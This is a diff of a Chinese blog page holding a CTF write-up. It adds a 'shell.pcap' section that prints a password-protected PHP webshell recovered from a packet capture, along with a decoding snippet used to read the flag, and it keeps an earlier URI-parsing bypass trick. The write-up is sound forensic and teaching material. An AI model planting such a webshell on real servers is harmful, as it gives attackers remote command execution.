@@ -88,7 +88,11 @@
 <meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201808/1535347854.828794.png">
 <meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201808/1535348558.9510233.png">
 <meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201808/1535348650.7245767.png">
-<meta property="og:updated_time" content="2018-08-29T01:30:26.760Z">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551624.3463726.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551755.4014943.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551794.714041.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551890.8763635.png">
+<meta property="og:updated_time" content="2018-08-29T14:15:30.502Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网鼎杯第三场部分WriteUp">
 <meta name="twitter:description" content="dewas">
@@ -421,7 +425,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  353 字
+                  487 字
                 </span>
               
 
@@ -476,6 +480,18 @@
 <p><img src="https://blog-1252108140.cosbj.myqcloud.com/201808/1535348558.9510233.png" alt=""></p>
 <p>&emsp;&emsp;从而想到，uri可以构造为<a href="mailto:``.@c7f.zhuque.com" target="_blank" rel="noopener">``.@c7f.zhuque.com</a>/..//index.php<code></code></p>
 <p><img src="https://blog-1252108140.cosbj.myqcloud.com/201808/1535348650.7245767.png" alt=""></p>
+<h1 id="shell-pcap"><a href="#shell-pcap" class="headerlink" title="shell.pcap"></a>shell.pcap</h1><p>&emsp;&emsp;根据名称，猜测应该是webshell的数据包，直接搜索http协议</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551624.3463726.png" alt=""></p>
+<p>&emsp;&emsp;shell的代码为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$k = $_POST[<span class="string">'k'</span>];</span><br><span class="line">$c = $_POST[<span class="string">'c'</span>];</span><br><span class="line">$o = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (md5($k) == <span class="string">'6d697064ad1b78f7e124df9807284f69'</span>) &#123;</span><br><span class="line"> exec($c, $o);</span><br><span class="line"> $o = $o[<span class="number">0</span>];</span><br><span class="line"> <span class="keyword">echo</span> base64_encode(gzcompress($o, <span class="number">6</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;因此查询到的数据需要用以下代码来进行解密。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$st = <span class="string">"内容"</span>;</span><br><span class="line">	$st = gzuncompress(base64_decode($st));</span><br><span class="line">	<span class="keyword">echo</span> $st;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;继续查看数据包</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551755.4014943.png" alt=""></p>
+<p>&emsp;&emsp;查看flag.txt的内容，因此下面的数据包应该有加密后的flag。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551794.714041.png" alt=""></p>
+<p>&emsp;&emsp;拿去解密，并获取flag</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201808/1535551890.8763635.png" alt=""></p>
 
       
     </div>
@@ -688,7 +704,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dewas"><span class="nav-number">1.</span> <span class="nav-text">dewas</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#comein"><span class="nav-number">2.</span> <span class="nav-text">comein</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dewas"><span class="nav-number">1.</span> <span class="nav-text">dewas</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#comein"><span class="nav-number">2.</span> <span class="nav-text">comein</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shell-pcap"><span class="nav-number">3.</span> <span class="nav-text">shell.pcap</span></a></li></ol></div>
             
 
           </div>
@@ -722,7 +738,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">69.6k</span>
+    <span title="Site words total count">69.7k</span>
   
 </div>
 
